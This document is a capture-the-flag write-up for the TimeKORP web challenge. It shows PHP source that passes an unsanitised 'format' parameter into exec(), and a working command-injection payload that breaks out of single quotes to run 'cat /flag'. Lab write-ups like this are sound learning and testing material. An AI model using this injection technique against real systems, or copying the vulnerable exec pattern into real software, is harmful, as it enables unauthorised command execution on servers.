# TimeKORP CTF Write-Up 🕒

## 🟢 Overview
- **Category:** Web
- **Challenge Name:** TimeKORP
- **Objective:** Retrieve the flag from a Docker-based PHP app vulnerable to command injection.
- **Tools Used:** Browser, grep, PHP source analysis

## 🔍 Initial Recon
- Accessed: `http://94.237.51.163:49486`
I accessed the challenge at `http://94.237.51.163:49486/` and was greeted by a simple page displaying the current time. Right away, I noticed that the URL accepted a `format` parameter:
- Source code provided: `index.php`, `router.php`, `TimeController.php`, `TimeModel.php`, `Dockerfile`


Changing the value affected how the time was displayed, so I suspected this value was being passed directly into a time-related function.

---

## 🧠 Step 2: Vulnerability Discovery

I checked out the files provided:
- `index.php`
- `router.php`
- `TimeController.php`
- `TimeModel.php`
- `Dockerfile`

The routing system was custom-built. The controller for the root path (`/`) was `TimeController@index`, which led me to this logic:
```php
$format = isset($_GET['format']) ? $_GET['format'] : '%H:%M:%S';
$time = new TimeModel($format);
return $router->view('index', ['time' => $time->getTime()]);
```

I then looked into TimeModel.php and found this vulnerability:
```php
$this->command = "date '+" . $format . "' 2>&1";
$time = exec($this->command);
```
$format was not sanitized, meaning our answer was a command injection.

## Exploitation
I started by testing a simple payload to read the flag:
```
?format=%25H%25M%25S;cat%20/flag
```
The output was:
```
It's 06:58:11;cat /flag.
```
So the app accepted the command — but it didn’t show the result of cat /flag. Why? After testing and re-reading the code, I realized the issue:
- The entire format string was inside single quotes '...'
- The date command just treated ;cat /flag as part of the format string

To fix it, I had to break out of the string early, then inject my own command.
Here’s what worked:
```
?format=%25H%25M%25S%27;%20cat%20/flag%20%23
```
Decoded, this becomes:
```
date '+%H%M%S'; cat /flag #'
```
This cleanly ends the date command, runs cat /flag, and comments out anything afterward. Finally, I got the flag printed directly in the browser.

🧠 What I Learned
  - Even simple parameters like ?format= can lead to full command injection when passed into system calls.
  
  - PHP's exec() only returns the last line of output, which can be misleading during testing.
  
  - Escaping out of shell strings is a key technique in exploitation.
  
  - Reviewing source code is critical — it turned what could've been a guessing game into a targeted attack.
